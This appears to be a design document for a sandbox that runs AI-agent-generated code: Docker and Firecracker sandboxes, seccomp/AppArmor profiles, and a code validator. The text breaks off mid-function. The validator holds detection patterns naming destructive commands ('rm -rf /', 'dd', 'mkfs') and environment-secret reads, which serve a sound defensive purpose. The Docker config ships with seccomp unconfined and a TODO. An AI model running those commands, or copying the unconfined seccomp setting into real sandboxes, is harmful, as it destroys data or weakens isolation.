# Execution Sandbox Manager - Deep Dive Design
## Complete Architecture, Implementation Guide, and Security Model

**Component**: Execution Sandbox Manager
**Purpose**: Secure, isolated code execution environment for MCP code execution pattern
**Priority**: 🔴 Critical (Security-sensitive)
**Phase**: Phase 4 (Week 6)

---

## 🎯 Executive Summary

The **Execution Sandbox Manager** is the security-critical component that enables the revolutionary MCP code execution approach while maintaining enterprise-grade security through multi-layer isolation, validation, and monitoring.

**Key Responsibilities**:
1. Execute agent-generated code in isolated environments
2. Validate code for security risks before execution
3. Enforce user approval gates for high-risk operations
4. Provide comprehensive audit logging for compliance
5. Tokenize PII to prevent model exposure
6. Monitor and enforce network policies

**Security Model**: Defense in depth with 6 layers
**Performance Target**: <200ms overhead for Docker, <2s for VM
**Reliability Target**: 99.9% uptime, graceful degradation

---

## 🏗️ Architecture Overview

### Component Hierarchy

```
ExecutionEngine
    ├── SandboxManager          (Orchestrator)
    │   ├── SandboxSelector     (Choose sandbox type)
    │   ├── ExecutionContext    (Prepare environment)
    │   └── ResultProcessor     (Handle outputs)
    │
    ├── Sandboxes               (Isolation implementations)
    │   ├── DockerSandbox       (Production default)
    │   ├── VMSandbox           (Maximum security)
    │   └── ProcessSandbox      (Development only)
    │
    ├── Security                (Validation & Protection)
    │   ├── CodeValidator       (Pattern detection)
    │   ├── InputSanitizer      (Input cleaning)
    │   ├── RiskClassifier      (Risk assessment)
    │   ├── ApprovalGate        (User confirmation)
    │   ├── NetworkPolicy       (Network isolation)
    │   └── PIITokenizer        (Privacy protection)
    │
    ├── Monitoring              (Observability)
    │   ├── AuditLogger         (Execution logs)
    │   ├── MetricsCollector    (Performance metrics)
    │   └── AlertManager        (Security alerts)
    │
    └── Workspace               (State Management)
        ├── FileManager         (File operations)
        ├── StateManager        (Persistent state)
        └── CacheManager        (Result caching)
```

### Data Flow

```
Agent generates code
        ↓
CodeValidator.validate(code)
        ↓
    Valid? ────No───→ Reject with error
        ↓ Yes
RiskClassifier.assess(code)
        ↓
  High risk? ──Yes─→ ApprovalGate.request()
        ↓ No              ↓
        ↓           Approved? ─No→ Reject
        ↓ Yes           ↓ Yes
        └──────────┬────┘
                   ↓
SandboxSelector.select(riskLevel)
                   ↓
    ┌──────────────┼──────────────┐
    ↓              ↓              ↓
DockerSandbox  VMSandbox  ProcessSandbox
    ↓              ↓              ↓
    └──────────────┼──────────────┘
                   ↓
PIITokenizer.tokenize(input)
                   ↓
NetworkPolicy.enforce()
                   ↓
Execute code in isolated environment
                   ↓
PIITokenizer.detokenize(output)
                   ↓
AuditLogger.log(execution)
                   ↓
Return result to agent
```

---

## 🔒 Security Architecture

### 6-Layer Defense in Depth

```yaml
layer_1_validation:
  component: CodeValidator
  purpose: Detect malicious patterns before execution
  actions:
    - Regex pattern matching
    - AST parsing for suspicious constructs
    - Complexity analysis
    - Obfuscation detection
  block_on: Critical patterns detected

layer_2_risk_classification:
  component: RiskClassifier
  purpose: Assess potential impact of code
  levels: [low, medium, high, critical]
  factors:
    - File operations (read/write/delete)
    - Network operations (HTTP/TCP/DNS)
    - System operations (process, shell)
    - Data volume (bytes processed)

layer_3_approval_gates:
  component: ApprovalGate
  purpose: Human-in-the-loop for high-risk operations
  triggers:
    - Critical risk level (always)
    - High risk level (configurable)
    - Destructive operations (rm, DROP, DELETE)
    - External network access
  bypass: User can configure auto-approve for trusted contexts

layer_4_sandbox_isolation:
  component: Sandbox (Docker/VM/Process)
  purpose: Contain code execution in isolated environment
  features:
    - Filesystem isolation (no host access)
    - Network isolation (whitelist only)
    - Resource limits (CPU, memory, time)
    - Capability dropping (no root, no device access)

layer_5_network_policy:
  component: NetworkPolicy
  purpose: Control egress traffic
  enforcement:
    - Whitelist allowed domains
    - Blacklist private networks
    - Rate limiting per destination
    - DNS query logging

layer_6_audit_logging:
  component: AuditLogger
  purpose: Comprehensive execution tracking
  captures:
    - Code executed (hash + full content)
    - Inputs and outputs
    - User approvals
    - Security violations
    - Performance metrics
  retention: 90 days (configurable)
  compliance: SOC2, GDPR, HIPAA ready
```

---

## 🔧 Core Interfaces

### Primary Interfaces

```typescript
// core/execution-engine/types.ts

/**
 * Main sandbox manager interface
 */
export interface ISandboxManager {
  /**
   * Execute code in appropriate sandbox
   * @param code - Code to execute
   * @param options - Execution options
   * @returns Execution result with output and metadata
   */
  execute(code: string, options: ExecutionOptions): Promise<ExecutionResult>;

  /**
   * Validate code without executing
   * @param code - Code to validate
   * @returns Validation result
   */
  validate(code: string): Promise<ValidationResult>;

  /**
   * Get current sandbox status
   * @returns Status of all active sandboxes
   */
  getStatus(): Promise<SandboxStatus[]>;

  /**
   * Cleanup idle sandboxes
   */
  cleanup(): Promise<void>;
}

/**
 * Base sandbox interface
 * All sandbox implementations must implement this
 */
export interface ISandbox {
  /**
   * Sandbox type identifier
   */
  readonly type: SandboxType;

  /**
   * Initialize sandbox environment
   */
  initialize(config: SandboxConfig): Promise<void>;

  /**
   * Execute code in sandbox
   */
  execute(code: string, options: ExecutionOptions): Promise<ExecutionResult>;

  /**
   * Cleanup and destroy sandbox
   */
  destroy(): Promise<void>;

  /**
   * Check if sandbox is healthy
   */
  healthCheck(): Promise<boolean>;
}

/**
 * Security validator interface
 */
export interface ISecurityValidator {
  /**
   * Validate code for security issues
   */
  validate(code: string): ValidationResult;

  /**
   * Classify risk level
   */
  classifyRisk(code: string): RiskLevel;

  /**
   * Detect specific vulnerability types
   */
  detectVulnerabilities(code: string): Vulnerability[];
}

/**
 * Approval gate interface
 */
export interface IApprovalGate {
  /**
   * Request user approval for operation
   */
  requestApproval(request: ApprovalRequest): Promise<boolean>;

  /**
   * Check if approval is required
   */
  requiresApproval(riskLevel: RiskLevel, options: ExecutionOptions): boolean;

  /**
   * Get user preferences for auto-approval
   */
  getPreferences(): ApprovalPreferences;
}

/**
 * Audit logger interface
 */
export interface IAuditLogger {
  /**
   * Log execution event
   */
  log(entry: AuditLogEntry): Promise<void>;

  /**
   * Query audit logs
   */
  query(filters: AuditLogFilters): Promise<AuditLogEntry[]>;

  /**
   * Generate compliance report
   */
  generateReport(period: DateRange): Promise<ComplianceReport>;
}
```

### Type Definitions

```typescript
// core/execution-engine/types.ts (continued)

export type SandboxType = 'docker' | 'vm' | 'process';

export type RiskLevel = 'low' | 'medium' | 'high' | 'critical';

export type SecurityLevel = 'maximum' | 'high' | 'moderate' | 'low';

export interface ExecutionOptions {
  // Security
  security_level?: SecurityLevel;
  force_approval?: boolean;
  allow_network?: boolean;
  allowed_domains?: string[];

  // Resources
  timeout?: number;           // milliseconds
  memory_limit?: string;      // e.g., '512MB'
  cpu_quota?: number;         // percentage (0-100)

  // Filesystem
  filesystem_scope?: 'none' | 'workspace-only' | 'read-only' | 'full';
  workspace_path?: string;

  // Behavior
  action?: string;            // Description for audit log
  user_id?: string;
  session_id?: string;

  // Advanced
  environment_vars?: Record<string, string>;
  preserve_state?: boolean;
  cache_result?: boolean;
}

export interface ExecutionResult {
  // Output
  stdout: string;
  stderr: string;
  exitCode: number;

  // Metadata
  success: boolean;
  duration_ms: number;
  tokens_used: number;

  // Resources
  memory_used: number;
  cpu_time_ms: number;

  // Files
  files_created: string[];
  files_modified: string[];
  files_deleted: string[];

  // Network
  network_requests: NetworkRequest[];

  // State
  state_changes: StateChange[];

  // Errors
  error?: ExecutionError;
  warnings: string[];
}

export interface ValidationResult {
  valid: boolean;
  violations: Violation[];
  risk_level: RiskLevel;
  complexity_score: number;
  estimated_resources: ResourceEstimate;
}

export interface Violation {
  type: ViolationType;
  severity: 'critical' | 'high' | 'medium' | 'low';
  pattern: string;
  line: number;
  description: string;
  recommendation: string;
}

export type ViolationType =
  | 'command_injection'
  | 'path_traversal'
  | 'arbitrary_code_execution'
  | 'sensitive_data_exposure'
  | 'excessive_complexity'
  | 'obfuscation_detected'
  | 'dangerous_function'
  | 'network_abuse';

export interface ApprovalRequest {
  action: string;
  code: string;
  code_hash: string;
  risk_level: RiskLevel;
  impact: ImpactAssessment;
  estimated_duration: number;
  estimated_resources: ResourceEstimate;
}

export interface ImpactAssessment {
  files_affected: string[];
  files_deleted: number;
  networks_accessed: string[];
  commands_executed: string[];
  data_modified: boolean;
  data_volume_bytes: number;
  reversible: boolean;
  blast_radius: 'contained' | 'local' | 'system' | 'network';
}

export interface AuditLogEntry {
  // Identity
  id: string;
  timestamp: Date;
  session_id: string;
  user_id: string;

  // Execution
  action: string;
  code: string;
  code_hash: string;
  input: any;
  output: any;

  // Environment
  sandbox_type: SandboxType;
  security_level: SecurityLevel;

  // Results
  duration_ms: number;
  tokens_used: number;
  success: boolean;
  error?: string;

  // Security
  risk_level: RiskLevel;
  violations: Violation[];
  approved: boolean;
  auto_approved: boolean;
  approver?: string;

  // Resources
  resources_used: ResourceUsage;

  // Model
  model: string;
  model_version: string;
}

export interface ResourceUsage {
  memory_bytes: number;
  cpu_ms: number;
  disk_bytes_read: number;
  disk_bytes_written: number;
  network_bytes_sent: number;
  network_bytes_received: number;
}
```

---

## 🐳 Docker Sandbox Implementation

### Design Philosophy

**Goals**:
- Strong isolation without VM overhead
- Fast startup (<200ms)
- Resource limits enforcement
- Network policy control
- Filesystem restrictions

**Trade-offs**:
- More isolation than process, less than VM
- Requires Docker daemon
- ~100-200ms startup overhead
- Suitable for 90% of use cases

### Implementation

```typescript
// core/execution-engine/sandbox/docker-sandbox.ts

import Docker from 'dockerode';
import * as fs from 'fs/promises';
import * as path from 'path';
import { ISandbox, ExecutionOptions, ExecutionResult, SandboxConfig } from '../types';

export class DockerSandbox implements ISandbox {
  readonly type = 'docker';

  private docker: Docker;
  private containerId?: string;
  private config: SandboxConfig;

  // Container configuration
  private readonly DEFAULT_IMAGE = 'node:18-alpine';
  private readonly DEFAULT_MEMORY = 512 * 1024 * 1024; // 512MB
  private readonly DEFAULT_CPU_QUOTA = 50000; // 50% CPU
  private readonly DEFAULT_TIMEOUT = 30000; // 30 seconds

  constructor(config?: SandboxConfig) {
    this.docker = new Docker();
    this.config = config || this.getDefaultConfig();
  }

  async initialize(config: SandboxConfig): Promise<void> {
    this.config = { ...this.config, ...config };

    // Ensure image is available
    await this.ensureImage(this.config.image || this.DEFAULT_IMAGE);

    // Create workspace directory
    if (this.config.workspace) {
      await fs.mkdir(this.config.workspace, { recursive: true });
    }
  }

  async execute(
    code: string,
    options: ExecutionOptions
  ): Promise<ExecutionResult> {
    const startTime = Date.now();

    try {
      // 1. Prepare execution environment
      const execEnv = await this.prepareEnvironment(code, options);

      // 2. Create container
      const container = await this.createContainer(execEnv, options);
      this.containerId = container.id;

      // 3. Start container
      await container.start();

      // 4. Wait for completion with timeout
      const result = await this.waitForCompletion(
        container,
        options.timeout || this.DEFAULT_TIMEOUT
      );

      // 5. Collect output and metadata
      const output = await this.collectOutput(container);

      // 6. Cleanup
      await this.cleanupContainer(container);

      return {
        stdout: output.stdout,
        stderr: output.stderr,
        exitCode: result.StatusCode,
        success: result.StatusCode === 0,
        duration_ms: Date.now() - startTime,
        tokens_used: this.estimateTokens(output.stdout),
        memory_used: output.stats.memory_stats.max_usage,
        cpu_time_ms: this.calculateCPUTime(output.stats.cpu_stats),
        files_created: await this.detectFilesCreated(execEnv.workspace),
        files_modified: [],
        files_deleted: [],
        network_requests: await this.extractNetworkRequests(output.logs),
        state_changes: [],
        warnings: this.detectWarnings(output.stderr)
      };

    } catch (error) {
      // Ensure cleanup on error
      if (this.containerId) {
        await this.forceCleanup(this.containerId);
      }

      throw new ExecutionError(
        `Docker sandbox execution failed: ${error.message}`,
        {
          code,
          options,
          duration_ms: Date.now() - startTime,
          error
        }
      );
    }
  }

  private async createContainer(
    execEnv: ExecutionEnvironment,
    options: ExecutionOptions
  ): Promise<Docker.Container> {
    // Build container configuration
    const containerConfig: Docker.ContainerCreateOptions = {
      Image: this.config.image || this.DEFAULT_IMAGE,

      // Command to execute
      Cmd: ['node', '-e', execEnv.code],

      // Environment variables
      Env: this.buildEnvVars(execEnv, options),

      // Working directory
      WorkingDir: '/workspace',

      // Host configuration
      HostConfig: {
        // Memory limits
        Memory: this.parseMemoryLimit(
          options.memory_limit || '512MB'
        ),
        MemorySwap: this.parseMemoryLimit(
          options.memory_limit || '512MB'
        ), // No swap

        // CPU limits
        CpuQuota: options.cpu_quota || this.DEFAULT_CPU_QUOTA,
        CpuPeriod: 100000, // 100ms period

        // Network configuration
        NetworkMode: options.allow_network ? 'bridge' : 'none',
        Dns: options.allow_network
          ? ['8.8.8.8', '8.8.4.4']
          : [],
        DnsSearch: [],

        // Security options
        ReadonlyRootfs: true, // Root filesystem read-only
        SecurityOpt: [
          'no-new-privileges', // Prevent privilege escalation
          'seccomp=unconfined' // TODO: Add custom seccomp profile
        ],

        // Capability dropping (remove all Linux capabilities)
        CapDrop: ['ALL'],

        // Volume mounts
        Binds: this.buildVolumeMounts(execEnv, options),

        // Resource cleanup
        AutoRemove: false, // Manual cleanup for better control

        // Ulimits
        Ulimits: [
          { Name: 'nofile', Soft: 1024, Hard: 1024 }, // File descriptors
          { Name: 'nproc', Soft: 256, Hard: 256 }    // Processes
        ]
      },

      // Network settings
      NetworkingConfig: options.allow_network
        ? this.buildNetworkConfig(options)
        : undefined,

      // Labels for identification
      Labels: {
        'code-assistant': 'true',
        'session-id': options.session_id || 'unknown',
        'risk-level': this.classifyRisk(execEnv.code).toString()
      }
    };

    return await this.docker.createContainer(containerConfig);
  }

  private buildVolumeMounts(
    execEnv: ExecutionEnvironment,
    options: ExecutionOptions
  ): string[] {
    const mounts: string[] = [];

    // Workspace mount (if allowed)
    if (options.filesystem_scope !== 'none' && execEnv.workspace) {
      const mode = options.filesystem_scope === 'read-only' ? 'ro' : 'rw';
      mounts.push(`${execEnv.workspace}:/workspace:${mode}`);
    }

    // tmpfs for temporary files (in-memory, fast, auto-cleanup)
    mounts.push('/tmp:tmpfs');

    return mounts;
  }

  private buildNetworkConfig(
    options: ExecutionOptions
  ): Docker.NetworkingConfig {
    if (!options.allow_network) {
      return undefined;
    }

    // Custom network with policy enforcement
    return {
      EndpointsConfig: {
        'code-assistant-network': {
          // Network-level firewall rules
          // (Additional to iptables enforcement)
        }
      }
    };
  }

  private async waitForCompletion(
    container: Docker.Container,
    timeout: number
  ): Promise<{ StatusCode: number }> {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        // Timeout: kill container
        container.kill().catch(() => {});
        reject(new Error(`Execution timeout after ${timeout}ms`));
      }, timeout);

      container.wait((err, data) => {
        clearTimeout(timer);
        if (err) reject(err);
        else resolve(data);
      });
    });
  }

  private async collectOutput(
    container: Docker.Container
  ): Promise<ContainerOutput> {
    // Get logs
    const logsStream = await container.logs({
      stdout: true,
      stderr: true,
      timestamps: true
    });

    const logs = logsStream.toString('utf-8');
    const [stdout, stderr] = this.parseDockerLogs(logs);

    // Get container stats
    const stats = await container.stats({ stream: false });

    // Get network activity (if network enabled)
    const networkStats = stats.networks || {};

    return {
      stdout,
      stderr,
      stats,
      logs,
      networkActivity: this.parseNetworkActivity(networkStats)
    };
  }

  private async cleanupContainer(
    container: Docker.Container
  ): Promise<void> {
    try {
      // Stop if still running
      const info = await container.inspect();
      if (info.State.Running) {
        await container.stop({ t: 5 }); // 5 second grace period
      }

      // Remove container
      await container.remove({ force: true });

      this.containerId = undefined;

    } catch (error) {
      // Log but don't throw (best effort cleanup)
      console.error('Container cleanup error:', error);
    }
  }

  private async forceCleanup(containerId: string): Promise<void> {
    try {
      const container = this.docker.getContainer(containerId);
      await container.kill();
      await container.remove({ force: true });
    } catch (error) {
      console.error('Force cleanup failed:', error);
    }
  }

  async destroy(): Promise<void> {
    if (this.containerId) {
      await this.forceCleanup(this.containerId);
    }
  }

  async healthCheck(): Promise<boolean> {
    try {
      // Check Docker daemon
      await this.docker.ping();

      // Check image available
      const images = await this.docker.listImages({
        filters: { reference: [this.config.image || this.DEFAULT_IMAGE] }
      });

      return images.length > 0;

    } catch (error) {
      return false;
    }
  }

  private async ensureImage(imageName: string): Promise<void> {
    // Check if image exists locally
    const images = await this.docker.listImages({
      filters: { reference: [imageName] }
    });

    if (images.length === 0) {
      // Pull image
      console.log(`Pulling Docker image: ${imageName}...`);

      const stream = await this.docker.pull(imageName);

      // Wait for pull to complete
      await new Promise((resolve, reject) => {
        this.docker.modem.followProgress(stream, (err, res) => {
          if (err) reject(err);
          else resolve(res);
        });
      });

      console.log(`✅ Image pulled: ${imageName}`);
    }
  }

  private parseMemoryLimit(limit: string): number {
    const units: Record<string, number> = {
      'B': 1,
      'KB': 1024,
      'MB': 1024 * 1024,
      'GB': 1024 * 1024 * 1024
    };

    const match = limit.match(/^(\d+)([A-Z]+)$/);
    if (!match) throw new Error(`Invalid memory limit: ${limit}`);

    const [, amount, unit] = match;
    return parseInt(amount) * units[unit];
  }

  private classifyRisk(code: string): RiskLevel {
    // Quick heuristic for container labeling
    if (/rm -rf|dd if=|mkfs/.test(code)) return 'critical';
    if (/\.delete\(|\.remove\(|DROP/.test(code)) return 'high';
    if (/\.write\(|\.update\(|INSERT/.test(code)) return 'medium';
    return 'low';
  }

  private getDefaultConfig(): SandboxConfig {
    return {
      image: this.DEFAULT_IMAGE,
      memory_limit: '512MB',
      cpu_quota: 50,
      network_mode: 'none',
      workspace: '/tmp/code-assistant-workspace'
    };
  }
}
```

### Docker Security Profile

```typescript
// core/execution-engine/sandbox/docker-security-profile.ts

/**
 * Seccomp profile for Docker containers
 * Restricts system calls to safe subset
 */
export const SECCOMP_PROFILE = {
  defaultAction: 'SCMP_ACT_ERRNO',
  architectures: ['SCMP_ARCH_X86_64', 'SCMP_ARCH_X86', 'SCMP_ARCH_AARCH64'],

  syscalls: [
    // Allow essential syscalls only
    {
      names: [
        // File operations (read-only + workspace)
        'read', 'write', 'open', 'close', 'stat', 'fstat', 'lstat',
        'access', 'readlink', 'getcwd',

        // Process management
        'exit', 'exit_group', 'wait4', 'clone', 'fork', 'execve',

        // Memory management
        'brk', 'mmap', 'munmap', 'mprotect',

        // Networking (if allowed)
        'socket', 'connect', 'send', 'recv', 'sendto', 'recvfrom',
        'bind', 'listen', 'accept',

        // Time
        'gettimeofday', 'clock_gettime', 'nanosleep',

        // Signal handling
        'rt_sigaction', 'rt_sigprocmask', 'rt_sigreturn',

        // Other essentials
        'getpid', 'getuid', 'getgid', 'arch_prctl', 'set_tid_address'
      ],
      action: 'SCMP_ACT_ALLOW'
    },

    // Block dangerous syscalls
    {
      names: [
        'reboot',           // System reboot
        'swapon', 'swapoff', // Swap management
        'mount', 'umount',  // Filesystem mounting
        'chroot',           // Change root
        'pivot_root',       // Pivot root
        'ptrace',           // Process tracing
        'kexec_load',       // Kernel execution
        'module_load',      // Kernel modules
        'acct',             // Process accounting
        'settimeofday',     // Set system time
        'sethostname',      // Set hostname
        'setdomainname'     // Set domain name
      ],
      action: 'SCMP_ACT_ERRNO'
    }
  ]
};

/**
 * AppArmor profile for additional security
 */
export const APPARMOR_PROFILE = `
#include <tunables/global>

profile code-assistant-sandbox flags=(attach_disconnected) {
  #include <abstractions/base>

  # Deny network access by default
  deny network,

  # Allow specific network (if configured)
  network inet stream,
  network inet6 stream,

  # Filesystem restrictions
  / r,
  /workspace/** rw,
  /tmp/** rw,
  deny /etc/** w,
  deny /proc/** w,
  deny /sys/** w,
  deny /dev/** w,

  # Deny dangerous capabilities
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_rawio,
  deny capability sys_boot,
  deny capability sys_time,
  deny capability dac_override,
  deny capability setuid,
  deny capability setgid,

  # Allow process execution
  /usr/bin/node ix,
  /usr/bin/python3 ix,
}
`;
```

---

## 🖥️ VM Sandbox Implementation

### Design Philosophy

**Goals**:
- Maximum isolation (strongest security)
- Complete OS-level separation
- Suitable for untrusted code
- Defense against kernel exploits

**Trade-offs**:
- Higher overhead (1-2s startup)
- More resource intensive
- Complex setup
- Use only for critical/untrusted operations

### Implementation

```typescript
// core/execution-engine/sandbox/vm-sandbox.ts

import { createInterface } from 'readline';
import { spawn, ChildProcess } from 'child_process';
import { ISandbox, ExecutionOptions, ExecutionResult } from '../types';

/**
 * VM-based sandbox using Firecracker microVMs
 *
 * Provides maximum isolation through full OS virtualization
 * with minimal overhead compared to traditional VMs.
 */
export class VMSandbox implements ISandbox {
  readonly type = 'vm';

  private vmProcess?: ChildProcess;
  private vmId: string;

  // Firecracker configuration
  private readonly VM_KERNEL = '/opt/code-assistant/vmlinux';
  private readonly VM_ROOTFS = '/opt/code-assistant/rootfs.ext4';
  private readonly DEFAULT_MEMORY_MB = 512;
  private readonly DEFAULT_VCPUS = 1;

  constructor() {
    this.vmId = this.generateVMId();
  }

  async initialize(config: SandboxConfig): Promise<void> {
    // Verify Firecracker is installed
    if (!await this.checkFirecrackerInstalled()) {
      throw new Error('Firecracker not installed. Run: curl -Lo firecracker https://github.com/firecracker-microvm/firecracker/releases/download/v1.5.0/firecracker-v1.5.0-x86_64.tgz');
    }

    // Verify kernel and rootfs exist
    await this.verifyVMAssets();
  }

  async execute(
    code: string,
    options: ExecutionOptions
  ): Promise<ExecutionResult> {
    const startTime = Date.now();

    try {
      // 1. Create VM configuration
      const vmConfig = this.buildVMConfig(code, options);

      // 2. Write configuration
      await this.writeVMConfig(vmConfig);

      // 3. Start microVM
      await this.startVM(vmConfig);

      // 4. Execute code in VM
      const result = await this.executeInVM(code, options);

      // 5. Shutdown VM
      await this.shutdownVM();

      return {
        ...result,
        duration_ms: Date.now() - startTime
      };

    } catch (error) {
      // Force cleanup
      await this.forceShutdownVM();
      throw error;
    }
  }

  private buildVMConfig(
    code: string,
    options: ExecutionOptions
  ): FirecrackerConfig {
    return {
      'boot-source': {
        kernel_image_path: this.VM_KERNEL,
        boot_args: 'console=ttyS0 reboot=k panic=1 pci=off'
      },

      'drives': [
        {
          drive_id: 'rootfs',
          path_on_host: this.VM_ROOTFS,
          is_root_device: true,
          is_read_only: true // Root filesystem read-only
        }
      ],

      'machine-config': {
        vcpu_count: options.cpu_quota ? Math.ceil(options.cpu_quota / 100) : this.DEFAULT_VCPUS,
        mem_size_mib: this.parseMemoryMB(options.memory_limit || '512MB'),
        ht_enabled: false, // Disable hyperthreading for security
        track_dirty_pages: false
      },

      'network-interfaces': options.allow_network
        ? [{
            iface_id: 'eth0',
            guest_mac: this.generateMAC(),
            host_dev_name: `tap-${this.vmId}`
          }]
        : [], // No network interfaces = complete network isolation

      'logger': {
        log_path: `/tmp/firecracker-${this.vmId}.log`,
        level: 'Info',
        show_level: true,
        show_log_origin: true
      },

      'metrics': {
        metrics_path: `/tmp/firecracker-${this.vmId}-metrics.json`
      }
    };
  }

  private async startVM(config: FirecrackerConfig): Promise<void> {
    return new Promise((resolve, reject) => {
      // Start Firecracker process
      this.vmProcess = spawn('firecracker', [
        '--api-sock', `/tmp/firecracker-${this.vmId}.sock`,
        '--config-file', `/tmp/firecracker-${this.vmId}-config.json`
      ], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      // Wait for VM to be ready
      const timeout = setTimeout(() => {
        reject(new Error('VM startup timeout'));
      }, 10000); // 10 second timeout

      this.vmProcess.stdout.on('data', (data) => {
        const output = data.toString();
        if (output.includes('Guest booted')) {
          clearTimeout(timeout);
          resolve();
        }
      });

      this.vmProcess.on('error', (error) => {
        clearTimeout(timeout);
        reject(error);
      });
    });
  }

  private async executeInVM(
    code: string,
    options: ExecutionOptions
  ): Promise<Partial<ExecutionResult>> {
    // Send code to VM via serial console
    const serialPath = `/tmp/firecracker-${this.vmId}-serial`;

    // Write code to execute
    await fs.writeFile('/tmp/code-to-execute.js', code);

    // Execute via VM
    const result = await this.sendCommandToVM(
      `node /tmp/code-to-execute.js`,
      options.timeout || 30000
    );

    return {
      stdout: result.stdout,
      stderr: result.stderr,
      exitCode: result.exitCode,
      success: result.exitCode === 0
    };
  }

  private async shutdownVM(): Promise<void> {
    if (!this.vmProcess) return;

    // Send shutdown signal
    await this.sendCommandToVM('poweroff', 5000);

    // Wait for process to exit
    await new Promise<void>((resolve) => {
      this.vmProcess.on('exit', () => resolve());
      setTimeout(resolve, 5000); // Force after 5s
    });

    // Cleanup
    this.vmProcess = undefined;
    await this.cleanupVMFiles();
  }

  private async forceShutdownVM(): Promise<void> {
    if (this.vmProcess) {
      this.vmProcess.kill('SIGKILL');
      this.vmProcess = undefined;
    }
    await this.cleanupVMFiles();
  }

  async healthCheck(): Promise<boolean> {
    try {
      // Check Firecracker binary
      const { execSync } = await import('child_process');
      execSync('which firecracker', { stdio: 'ignore' });

      // Check kernel and rootfs
      await fs.access(this.VM_KERNEL);
      await fs.access(this.VM_ROOTFS);

      return true;
    } catch {
      return false;
    }
  }

  private generateVMId(): string {
    return `vm-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
  }
}
```

---

## 🔐 Code Validator Implementation

### Validation Strategy

```typescript
// core/execution-engine/security/code-validator.ts

export class CodeValidator implements ISecurityValidator {
  // Dangerous patterns (RegEx)
  private readonly CRITICAL_PATTERNS: PatternRule[] = [
    {
      pattern: /eval\s*\(/,
      type: 'arbitrary_code_execution',
      severity: 'critical',
      description: 'eval() allows arbitrary code execution',
      recommendation: 'Remove eval(), use safe alternatives'
    },
    {
      pattern: /Function\s*\(/,
      type: 'arbitrary_code_execution',
      severity: 'critical',
      description: 'Function() constructor allows code injection',
      recommendation: 'Remove Function(), use regular functions'
    },
    {
      pattern: /child_process\.(exec|spawn)\([^)]*\$\{/,
      type: 'command_injection',
      severity: 'critical',
      description: 'Command injection via template literal',
      recommendation: 'Use parameterized spawn() with array arguments'
    },
    {
      pattern: /rm\s+-rf\s+\//,
      type: 'dangerous_operation',
      severity: 'critical',
      description: 'Recursive force delete from root',
      recommendation: 'Block this operation entirely'
    },
    {
      pattern: /process\.env\.(API_KEY|SECRET|PASSWORD|TOKEN)/,
      type: 'sensitive_data_exposure',
      severity: 'high',
      description: 'Potential secret exposure',
      recommendation: 'Use secure secret management'
    }
  ];

  private readonly HIGH_RISK_PATTERNS: PatternRule[] = [
    {
      pattern: /fs\.(unlink|rm|rmdir)/,
      type: 'file_deletion',
      severity: 'high',
      description: 'File deletion operation',
      recommendation: 'Require user approval for deletions'
    },
    {
      pattern: /(https?:\/\/|fetch\(|axios\.|request\()/,
      type: 'network_access',
      severity: 'medium',
      description: 'External network access',
      recommendation: 'Verify allowed domains'
    },
    {
      pattern: /\.sql|SELECT|INSERT|UPDATE|DELETE|DROP/i,
      type: 'database_operation',
      severity: 'medium',
      description: 'Database operation detected',
      recommendation: 'Use parameterized queries'
    }
  ];

  validate(code: string): ValidationResult {
    const violations: Violation[] = [];

    // 1. Pattern-based validation
    violations.push(...this.detectPatterns(code));

    // 2. AST-based validation
    violations.push(...this.validateAST(code));

    // 3. Complexity analysis
    const complexity = this.calculateComplexity(code);
    if (complexity > 50) {
      violations.push({
        type: 'excessive_complexity',
        severity: 'medium',
        pattern: 'Cyclomatic complexity',
        line: 0,
        description: `Code complexity: ${complexity} (threshold: 50)`,
        recommendation: 'Break into smaller functions'
      });
    }

    // 4. Obfuscation detection
    if (this.detectObfuscation(code)) {
      violations.push({
        type: 'obfuscation_detected',
        severity: 'critical',
        pattern: 'Code obfuscation',
        line: 0,
        description: 'Potential code obfuscation detected',
        recommendation: 'Code appears obfuscated, requires manual review'
      });
    }

    // 5. Determine risk level
    const risk_level = this.determineRiskLevel(violations);

    // 6. Estimate resources
    const estimated_resources = this.estimateResources(code);

    return {
      valid: violations.filter(v => v.severity === 'critical').length === 0,
      violations,
      risk_level,
      complexity_score: complexity,
      estimated_resources
    };
  }

  private detectPatterns(code: string): Violation[] {
    const violations: Violation[] = [];

    // Check critical patterns
    for (const rule of this.CRITICAL_PATTERNS) {
      const matches = this.findMatches(code, rule.pattern);
      for (const match of matches) {
        violations.push({
          type: rule.type,
          severity: rule.severity,
          pattern: rule.pattern.source,
          line: match.line,
          description: rule.description,
          recommendation: rule.recommendation
        });
      }
    }

    // Check high-risk patterns
    for (const rule of this.HIGH_RISK_PATTERNS) {
      const matches = this.findMatches(code, rule.pattern);
      for (const match of matches) {
        violations.push({
          type: rule.type,
          severity: rule.severity,
          pattern: rule.pattern.source,
          line: match.line,
          description: rule.description,
          recommendation: rule.recommendation
        });
      }
    }

    return violations;
  }

  private validateAST(code: string): Violation[] {
    const violations: Violation[] = [];

    try {
      // Parse code to AST
      const ast = this.parseToAST(code);

      // Detect dangerous constructs
      this.walkAST(ast, (node) => {
        // Check for dynamic imports
        if (node.type === 'ImportExpression') {
          violations.push({
            type: 'arbitrary_code_execution',
            severity: 'high',
            pattern: 'Dynamic import',
            line: node.loc.start.line,
            description: 'Dynamic import() can load arbitrary modules',
            recommendation: 'Use static imports only'
          });
        }

        // Check for eval-like constructs
        if (node.type === 'CallExpression') {
          if (node.callee.name === 'eval' ||
              node.callee.name === 'Function') {
            violations.push({
              type: 'arbitrary_code_execution',
              severity: 'critical',
              pattern: node.callee.name,
              line: node.loc.start.line,
              description: `${node.callee.name}() detected`,
              recommendation: 'Remove eval-like constructs'
            });
          }
        }

        // Check for require() with variables
        if (node.type === 'CallExpression' &&
            node.callee.name === 'require' &&
            node.arguments[0].type !== 'Literal') {
          violations.push({
            type: 'arbitrary_code_execution',
            severity: 'high',
            pattern: 'Dynamic require',
            line: node.loc.start.line,
            description: 'require() with non-literal argument',
            recommendation: 'Use literal module names only'
          });
        }
      });

    } catch (error) {
      // AST parsing failed - potentially malformed code
      violations.push({
        type: 'obfuscation_detected',
        severity: 'high',
        pattern: 'Parse error',
        line: 0,
        description: `Failed to parse code: ${error.message}`,
        recommendation: 'Code may be malformed or obfuscated'
      });
    }

    return violations;
  }

  private calculateComplexity(code: string): number {
    // Cyclomatic complexity calculation
    const controlFlowPatterns = [
